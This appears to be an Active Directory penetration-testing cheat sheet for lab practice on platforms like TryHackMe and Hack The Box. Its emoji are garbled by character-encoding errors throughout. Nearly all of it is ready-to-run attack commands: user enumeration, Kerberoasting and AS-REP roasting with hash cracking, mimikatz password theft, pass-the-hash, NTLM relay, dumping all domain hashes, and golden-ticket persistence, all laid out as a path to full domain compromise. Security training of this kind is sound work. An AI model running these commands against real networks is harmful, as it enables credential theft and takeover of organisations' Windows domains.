# 1.1 Quick Guide To AD Pentesting

## Quick Guide To AD Pentesting

**ğŸ”¥ Step-by-Step AD Pentesting Cheat Sheet**

#### **1ï¸âƒ£ Enumeration (Always Start Here!)**

Your goal: **Find Users, Computers, Groups, and AD Misconfigurations.**

ğŸ”¹ **Basic Enumeration (No Credentials)** âœ… `nmap -p 88,135,139,389,445,464,593,636,3268,3389 --script=ldap* --script=smb* <target>`\
âœ… `smbclient -L //target -N` â†’ Check SMB Shares\
âœ… `crackmapexec smb <target>` â†’ Check SMB, Users, and Shares\
âœ… `kerbrute userenum -d domain.com --dc <DC-IP> usernames.txt` â†’ Find Valid Users

ğŸ”¹ **Detailed Enumeration (With Credentials)** âœ… `bloodhound-python -u user -p pass -d domain.com -c All -dc-ip <DC-IP>` â†’ Full AD Mapping\
âœ… `rpcclient -U 'user%pass' <DC-IP>` â†’ Query AD Info\
âœ… `net group "Domain Admins" /domain` â†’ Check Domain Admins\
âœ… `net user /domain` â†’ List All Users\
âœ… `crackmapexec ldap <DC-IP> -u user -p pass --asreproast` â†’ Check for AS-REP Roastable Accounts

ğŸ“Œ **If You Find Null SMB Shares or Weak Users â†’ Move to Exploitation.**

***

#### **2ï¸âƒ£ Exploitation (Privilege Escalation & Lateral Movement)**

Your goal: **Escalate Privileges from a Low-Level User.**

ğŸ”¹ **Kerberoasting (If Kerberos Enabled)** âœ… `GetUserSPNs.py -dc-ip <DC-IP> domain/user:pass -request`\
âœ… `john --wordlist=rockyou.txt hash.txt`

ğŸ”¹ **AS-REP Roasting (If User Doesnâ€™t Require Pre-Auth)** âœ… `GetNPUsers.py -dc-ip <DC-IP> -usersfile users.txt domain/ -format hashcat`\
âœ… `hashcat -m 18200 hash.txt rockyou.txt --force`

ğŸ”¹ **Pass-the-Hash / Pass-the-Ticket (Lateral Movement)** âœ… `mimikatz.exe` â†’ `sekurlsa::logonpasswords` â†’ Steal Passwords\
âœ… `psexec.py domain/user@target -hashes LM:NT`

ğŸ”¹ **NTLM Relay Attacks (If SMB Signing is Disabled)** âœ… `ntlmrelayx.py -t smb://target --smb2support`

ğŸ“Œ **If you get a higher-privilege account â†’ Use It for Full Compromise.**

***

#### **3ï¸âƒ£ Full Domain Compromise (Domain Admin Access!)**

Your goal: **Get Domain Admin and Dump All Passwords.**

ğŸ”¹ **Check if You Are a Domain Admin** âœ… `whoami /groups`\
âœ… `net group "Domain Admins" /domain`

ğŸ”¹ **Dump All AD Hashes (If DA Access)** âœ… `secretsdump.py -dc-ip <DC-IP> domain/admin:password@target`

ğŸ”¹ **Golden Ticket Attack (Persistence)** âœ… `mimikatz.exe` â†’ `kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-XXXXX /krbtgt:HASH /ptt`

ğŸ“Œ **Once You Get DA â†’ You Have Fully Compromised the Domain!**

***

#### **ğŸ”¥ How to Know What to Use in a Lab? (Decision-Making Tree)**

âœ… **1. Do I have credentials?**

* âŒ No â†’ **Start with Enumeration**
* âœ… Yes â†’ **Use BloodHound & CrackMapExec**

âœ… **2. Can I Kerberoast / AS-REP Roast?**

* âœ… Yes â†’ **Extract Hashes & Crack Them**
* âŒ No â†’ **Try Lateral Movement**

âœ… **3. Do I have SMB, LDAP, or Kerberos Misconfigurations?**

* âœ… Yes â†’ **Exploit Using NTLM Relay, Pass-the-Hash, or Kerberos Attacks**
* âŒ No â†’ **Look for Local Privilege Escalation on Workstations**

âœ… **4. Do I have Domain Admin access?**

* âœ… Yes â†’ **Dump Hashes & Maintain Access**
* âŒ No â†’ **Pivot to Another User or Machine**

***

#### **ğŸ”¥ Next Steps for You**

* Use this **step-by-step method in any AD lab**.
* Start practicing **each attack individually on TryHackMe (THM) & Hack The Box (HTB).**
* Use **BloodHound** to **visualize attack paths** (this helps a lot).
* If stuck, **Google specific errors & read writeups** (everyone does this, even pros).
